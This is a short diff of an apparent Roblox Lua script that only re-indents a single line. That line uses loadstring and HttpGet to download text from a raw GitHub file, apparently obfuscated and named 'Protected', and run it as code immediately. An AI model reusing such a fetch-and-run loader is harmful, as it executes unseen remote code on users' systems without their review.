@@ -1,3 +1,2 @@
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/LolnotaKid/Vfxlogger2/refs/heads/main/Protected_2254404666009277.txt"))()
-
-    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LolnotaKid/Vfxlogger2/refs/heads/main/Protected_2254404666009277.txt"))()
+  
